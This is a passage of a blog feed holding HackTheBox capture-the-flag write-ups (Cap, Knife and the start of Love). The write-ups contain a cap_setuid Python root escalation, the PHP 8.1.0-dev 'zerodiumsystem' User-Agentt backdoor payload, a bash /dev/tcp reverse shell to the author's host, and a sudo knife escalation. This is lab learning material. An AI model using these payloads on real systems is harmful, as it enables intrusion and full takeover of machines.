+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> nathan nathan <span class="m">4293</span> Jun  <span class="m">9</span> 10:19 app.py
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 static
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 templates
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Jun  <span class="m">9</span> 10:12 upload
+</span></span><span class="line"><span class="cl">nathan@cap:/var/www/html$ </span></span></code></pre>
+</figure><p>Looking at the source code, I see one interesting line code in a variable called <code>command</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/capture&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@limiter.limit</span><span class="p">(</span><span class="s2">&#34;10 per minute&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">capture</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">get_lock</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pcapid</span> <span class="o">=</span> <span class="n">get_appid</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">increment_appid</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">release_lock</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">root_path</span><span class="p">,</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pcapid</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;.pcap&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># permissions issues with gunicorn and threads. hacky solution for now.</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#os.setuid(0)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#command = f&#34;timeout 5 tcpdump -w {path} -i any host {ip}&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;python3 -c &#39;import os; os.setuid(0); os.system(&#34;timeout 5 tcpdump -w </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> -i any host </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">&#34;)&#39;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#os.setuid(1000)</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span></span></span></code></pre>
+</figure><h4 id="linux-capabilities">Linux Capabilities</h4>
+<p>When I examine the running process, the web server is currently running as <code>nathan</code>, so <code>os.setuid(0)</code> shouldn&rsquo;t be possible, except the binary has a <code>CAP SETUID</code> <a href="https://gtfobins.github.io/gtfobins/python/#capabilities"target="_blank" rel="noopener noreferrer"
+>capability set</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210609174520024.png" alt="image-20210609174520024"  /></div>
+</p>
+<p>A quick check on the Python binary shows that it has the <code>cap_setuid</code> set.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3<span class="k">)</span>
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">9</span> Mar <span class="m">13</span>  <span class="m">2020</span> /usr/bin/python3 -&gt; python3.8
+</span></span><span class="line"><span class="cl">nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3.8<span class="k">)</span>
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">5486384</span> Jan <span class="m">27</span> 15:41 /usr/bin/python3.8
+</span></span><span class="line"><span class="cl">nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
+</span></span><span class="line"><span class="cl">/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip</span></span></code></pre>
+</figure><p>So I can escalate myself to root with <code>python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nathan@cap:/var/www/html$ python3 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">root@cap:/var/www/html# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@cap:/var/www/html# <span class="nb">cd</span> /root/
+</span></span><span class="line"><span class="cl">root@cap:/root# ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">8</span>
+</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun  <span class="m">9</span> 04:59 root.txt
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> May <span class="m">23</span> 19:17 snap</span></span></code></pre>
+</figure>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Knife</title>
+      <link>https://fahmifj.github.io/ctf/hackthebox/knife/</link>
+      <pubDate>Sat, 28 Aug 2021 22:00:49 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/ctf/hackthebox/knife/</guid>
+      <description>Exploiting the backdoor planted in PHP 8.1-dev</description>
+      <content:encoded><![CDATA[<p>Knife hosts a website that is running a hijacked version of PHP in which it contains a remote code execution backdoor. Leveraging this backdoor results in an interactive shell access to the system. The user has sudo permissions on <code>knife</code> , which can be exploited to run a malicious Ruby code.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Using a backdoor from a supply chain attack 😅</li>
+<li>Sudo exploitation on <code>knife</code>.</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>BurpSuite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Performing <code>nmap</code> all TCP scan discovers two open ports, SSH on 22 and an Apache web server on 80. Nothing much to see here.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «knife» «10.10.14.117»
+</span></span><span class="line"><span class="cl">$ fscan 10.10.10.242 knife
+</span></span><span class="line"><span class="cl">nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.10.242 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+</span></span><span class="line"><span class="cl">nmap -p 22,80 -sC -sV -oA nmap/10-tcp-allport-knife 10.10.10.242
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 10:19 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.242
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title:  Emergent Medical Idea
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.44 seconds</span></span></code></pre>
+</figure><blockquote>
+<p>fscan is just my Nmap wrapper to do full scan and immediately run script scan against the discovered ports .</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80----website">TCP 80  - Website</h3>
+<p>With <code>curl</code>, the hosted website shows that it&rsquo;s powered by PHP 8.1.0-dev.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «knife» «10.10.14.70» 
+</span></span><span class="line"><span class="cl">$ curl -sI http://10.10.10.242/
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">22</span> May <span class="m">2021</span> 21:46:13 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">X-Powered-By: PHP/8.1.0-dev
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8</span></span></code></pre>
+</figure><p>The website only displays some CSS text animation. The available menus aren&rsquo;t clickable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827213646250.png" alt="image-20210827213646250"  /></div>
+</p>
+<p>I did a Gobuster scan but it didn&rsquo;t output any interesting thing.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-james">Shell as james</h3>
+<h4 id="php-rce-backdoor">PHP RCE backdoor</h4>
+<p>Around March 2021, the PHP git server was compromised and two <a href="https://news-web.php.net/php.internals/113838"target="_blank" rel="noopener noreferrer"
+>malicious commit</a> were pushed to the PHP source code. The code from these commits allows an attacker to obtain remote code execution through the HTTP <code>User-Agent</code> header on any website that uses the hijacked version of PHP. In short, it&rsquo;s a backdoor.</p>
+<p>The commits were pushed into the development branch of PHP 8.1. From the previous web enumeration, the website returns with <code>X-Powered-By: PHP/8.1.0-dev</code> in its HTTP response. By presuming that the website uses the hijacked version of PHP, I can try to send a HTTP request with the following HTTP header.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">User-Agentt: zerodiumsystem(&#39;uname -a&#39;);</span></span></span></code></pre>
+</figure><p>And the web was vulnerable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827224703632.png" alt="image-20210827224703632"  /></div>
+</p>
+<p>Now to get reverse shell, I can send the following payload:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">User-Agentt: zerodiumsystem(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.70/9000 0&gt;&amp;1&#34;&#39;);</span></span></span></code></pre>
+</figure><p>When I send that payload, I have interactive shell access as <strong>james</strong> on my listener.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «knife» «10.10.14.70» 
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>  
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.70<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.242<span class="o">]</span> <span class="m">48566</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>966<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">james@knife:/$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span></span></span></code></pre>
+</figure><p>I also made a script to leverage this backdoor, <a href="https://github.com/fahmifj/php-8.1.0-dev-zerodium-rce"target="_blank" rel="noopener noreferrer"
+>here</a>.</p>
+<h4 id="shell-upgrade">Shell upgrade</h4>
+<p>I will do the PTY trick to upgrade my shell</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@knife:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">james@knife:/$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">james@knife:/$ ^Z
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> suspended  nc -nvlp <span class="m">9000</span>
+</span></span><span class="line"><span class="cl">→ root@kali «knife» «10.10.14.70» 
+</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> continued  nc -nvlp <span class="m">9000</span>
+</span></span><span class="line"><span class="cl">james@knife:/$ </span></span></code></pre>
+</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>User <strong>james</strong> is allowed to run <code>knife</code> as root.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@knife:/opt/chef-workstation/bin$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> james on knife:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User james may run the following commands on knife:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife</span></span></code></pre>
+</figure><h4 id="sudo---knife">Sudo - knife</h4>
+<p><code>knife</code> is a part of <a href="https://www.chef.io/products/chef-infra"target="_blank" rel="noopener noreferrer"
+>Chef</a>, a software for infrastructure management and automation. I&rsquo;m not familiar with that, but according to <a href="https://docs.chef.io/workstation/knife_exec/#examples"target="_blank" rel="noopener noreferrer"
+>this documentation</a>, <code>knife</code> can run a Ruby code or Ruby file script. Therefore, the tool can be abused like this.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@knife:~$ sudo knife <span class="nb">exec</span> -E <span class="s2">&#34;exec &#39;/bin/bash&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">root@knife:/home/james# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></span></span></code></pre>
+</figure><p>Now I can grab the root flag</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@knife:/home/james# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">c3744...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Love</title>
+      <link>https://fahmifj.github.io/ctf/hackthebox/love/</link>
+      <pubDate>Mon, 09 Aug 2021 05:38:45 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/ctf/hackthebox/love/</guid>
+      <description>Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality can be leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that AlwaysInstallElevated is enabled, and this can be leveraged to install a malicious .</description>
+      <content:encoded><![CDATA[<p>Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality can be leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that <code>AlwaysInstallElevated</code> is enabled, and this can be leveraged to install a malicious <code>.msi</code> installer and get SYSTEM access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SSRF</li>
+<li>Abusing Windows <strong>AlwaysInstallElevated</strong></li>
+<li>(Alternative) PrintNightmare LPE</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>WinPEAS</li>
+<li>msfvenom</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan scan discovers a bunch of open ports.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ fscan 10.10.10.239 love
+</span></span><span class="line"><span class="cl">nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.239 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+</span></span><span class="line"><span class="cl">nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-08 11:29 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.239
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.087s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Voting System using PHP
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-18T14:00:16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3306/tcp  open  mysql?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Host <span class="s1">&#39;10.10.14.51&#39;</span> is not allowed to connect to this MariaDB server
+</span></span><span class="line"><span class="cl">5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+</span></span><span class="line"><span class="cl">5040/tcp  open  unknown
+</span></span><span class="line"><span class="cl">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-11T14:39:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-08-08T15:53:52+00:00<span class="p">;</span> +21m37s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl">7680/tcp  open  pando-pub?
+</span></span><span class="line"><span class="cl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port3306-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/8%Time<span class="o">=</span>610FF878%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
+</span></span><span class="line"><span class="cl">SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;\x20is\x20not\x20allowe
+</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-os-discovery: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS CPE: cpe:/o:microsoft:windows_10::-
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Computer name: Love
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS computer name: LOVE\x00
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Workgroup: WORKGROUP\x00
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  System time: 2021-08-08T08:53:41-07:00
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   account_used: &lt;blank&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   authentication_level: user
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   challenge_response: supported
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  message_signing: disabled (dangerous, but default)
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   2.02: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled but not required
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2021-08-08T15:53:43
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds</span></span></span></code></pre>
+</figure><p>Most notable services are:</p>
+<ul>
+<li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
+<li>SMB on port 445, good start.</li>
